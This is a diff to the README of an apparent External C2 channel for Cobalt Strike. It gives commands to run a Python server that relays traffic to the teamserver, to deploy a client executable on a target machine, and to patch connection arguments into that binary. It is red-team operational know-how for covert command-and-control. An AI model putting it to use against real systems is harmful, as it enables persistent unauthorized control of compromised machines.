@@ -9,6 +9,10 @@ This channel also assumes the network uses IPv4. TCP allows for protocol-agnosti
 To use the Robust UDP channel, load up Cobalt Strike and add a new External C2 listener.
 This channel is configured to run on the default Teamserver port of 2222.
 
+Requirements: Python3 (developed on 3.9.2) and wolfssl
+
+> pip3 install wolfssl
+
 To start the server, run the following command:
 
 > python3 server.py [Teamserver IP] [Python Server IP] [Port] [Pipename] [Timeout] [Retries] [OPTIONAL:-tp TeamserverPort -a Arch -r Restart]
@@ -16,7 +20,7 @@ To start the server, run the following command:
 - [Teamserver IP] is the IP of your Cobalt Strike teamserver.
 - [Python Server IP] is the IP of the machine you are running server.py on. (“0.0.0.0” has been found to work on Linux machines, though it is unknown if this behavior is consistent everywhere.)
 - [Port] is the port that the server communicates with the client over. This is not the same port that the Python server uses to communicate with the teamserver.
-- [Pipename] is the name of the pipe the client creates when it runs on the target. This could be any valid pipename.
+- [Pipename] is the name of the pipe the client creates when it runs on the target. This could be any opsec appropriate pipe name approved for ops.
 - [Timeout] is the number of seconds to set the socket timeout to.
 - [Retries] is the number of times to retry listening for a connection after a timeout occurs.
 - [TeamserverPort] is the port to connect to on the Cobalt Strike teamserver. It defaults to 2222 and is an optional argument.  
@@ -38,7 +42,7 @@ Move the resultant executable to your target machine, and then run it with the f
 
 >./[Name].exe
 
-Use the binary patcher to patch in arguments <https://github.com/fitzgeralddaniel/binary_patcher>
+Use the binary patcher to patch in arguments.
 
 >python3 bipa.py [input binary] [output binary] -a [Python Server IP] -b [Port] -c [Pipename] -d [Sleep] -e [Timeout] -f [Retries]
 
